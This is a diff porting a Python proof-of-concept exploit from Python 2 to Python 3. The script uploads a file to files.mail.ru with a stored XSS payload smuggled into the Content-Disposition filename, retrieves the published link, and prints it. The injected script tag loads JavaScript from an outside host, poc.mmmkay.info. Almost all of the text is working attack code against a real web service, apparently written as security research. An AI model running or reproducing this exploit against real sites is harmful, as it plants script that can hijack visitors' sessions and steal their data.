@@ -1,13 +1,11 @@
-#!/usr/bin/env python2.7
-# -*- coding: utf-8 -*-
+#!/usr/bin/env python3.3
 
 import random
 import math
 import re
 import requests
 import json
-from urlparse import parse_qs
-import urllib
+import urllib.parse
 
 
 def encode_id(value):
@@ -34,14 +32,14 @@ def get_uploader_url(session):
 
 
 def upload_xss(session, url, xss):
-    payload = 'any'
+    payload = urllib.parse.quote('</title>' + xss, '')
     headers = {
-        'Content-Disposition': 'attachment; filename="' + urllib.quote('</title>' + xss, '') + '"',
+        'Content-Disposition': 'attachment; filename="{payload}"'.format(payload=payload),
         'Content-Length': 3,
         'Content-Type': 'application/octet-stream'
     }
-    req = session.post(url, data=payload, headers=headers)
-    file_id = parse_qs(req.text)['vfileid'][0]
+    req = session.post(url, data='stub', headers=headers)
+    file_id = urllib.parse.parse_qs(req.text)['vfileid'][0]
     return int(file_id)
 
 
@@ -50,20 +48,22 @@ def get_xss_link(session, file_id):
     req = session.post('http://files.mail.ru/', data={'mainsend': 'Get link', 'MRIS_IDS': mris_ids})
     return re.search('href="(?P<url>[^"]+)">Files are published</a>', req.text).group('url')
 
-session = requests.Session()
-session.headers.update({
-    'Accept-Language':  'en-US,en;'
-})
-session.cookies.update({
-    'flsmlrua': ''.join([random.choice('abcdef1234567890') for x in range(32)])
-})
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.headers.update({
+        'Accept-Language':  'en-US,en;'
+    })
+    session.cookies.update({
+        'flsmlrua': ''.join([random.choice('abcdef1234567890') for x in range(32)])
+    })
 
 
-uploader_url = get_uploader_url(session)
-xss_vector = '''<script src="http://poc.mmmkay.info/static/payload/files_mail.js"></script>'''
-uploaded_file_id = upload_xss(session, uploader_url, xss_vector)
-link = get_xss_link(session, uploaded_file_id)
+    uploader_url = get_uploader_url(session)
+    xss_vector = '''<script src="http://poc.mmmkay.info/static/payload/files_mail.js"></script>'''
+    uploaded_file_id = upload_xss(session, uploader_url, xss_vector)
+    link = get_xss_link(session, uploaded_file_id)
 
-print('Url with XSS: ' + link)
+    print('Url with XSS: ' + link)
 
 
